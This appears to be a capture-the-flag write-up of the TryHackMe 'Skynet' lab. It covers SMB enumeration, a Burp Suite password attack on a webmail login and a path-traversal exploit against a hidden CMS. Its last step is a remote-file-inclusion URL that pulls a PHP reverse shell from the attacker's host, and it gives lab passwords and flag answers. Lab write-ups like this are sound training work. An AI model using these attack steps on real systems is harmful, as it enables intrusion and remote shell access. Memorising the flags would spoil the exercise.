# TryHackMe - Skynet

A vulnerable Terminator themed Linux machine.

## Task 1  Deploy and compromise the vulnerable machine!

First step is to enumerate the system by running port scanning (nmap) and directory scanning (gobuster).

`nmap -sC -sV -oN nmap/initial 10.10.16.126`

`gobuster dir -u http://10.10.16.126/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt` 

###  - What is Miles password for his emails?

Noted there was an smb client.

To enumerate smb, I used: 
`enum4linux 10.10.16.126`

Outputed was sharenames,

`Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))`

We can now connect to the share using smbclient.

`smbclient //10.10.16.126/anonymous`

We see a attention.txt file that states, "A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson"

We now see theres a log directory. Inside that directory there is 3 log files. *Log1.txt* seems to contain passwords. We can copy and save this list for later. 

Now that we have a password list, and a known user *milesdyson*, we can head over to the web portal for mail logins and use *Burpsuite* to dictionary attack the login.

We can now use Burpsuite, intercept the login with the username of milesdyson, send to intruder, format to only sniper the password, then add our wordlist. This resulted in showing us the correct password for milesdyson.

Answer: `cyborg007haloterminator`

###  - What is the hidden directory?

After navigating around the squirrel mail, we see an email stating, "We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`"

This will allow us to login using the smbclient with milesdysons creds.

Once in, we can see a notes directory, and an important.txt.

The important.txt reads,
`1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife`

Answer: `/45kra24zxs28v3yd`

###  - What is the vulnerability called when you can include a remote file for malicious purposes?

`remote file inclusion`

###  - What is the user flag?

Enumerating the hidden directory found previously using gobuster, `/45kra24zxs28v3yd`, we find http://10.10.116.1/45kra24zxs28v3yd/administrator/

gobuster dir -u http://10.10.116.1/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-hidden-dir.txt

Using this exploit, we can pivot around the file system and find the user.txt.
https://www.exploit-db.com/exploits/25971

http://10.10.9.153/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt

Answer: `7ce5c2109a40f958099283600a9ae807`

###  - What is the root flag?

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

http://10.10.116.1/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.80.72/php-reverse-shell.txt?

`3f0372db24753accc7179a282cd6a949`
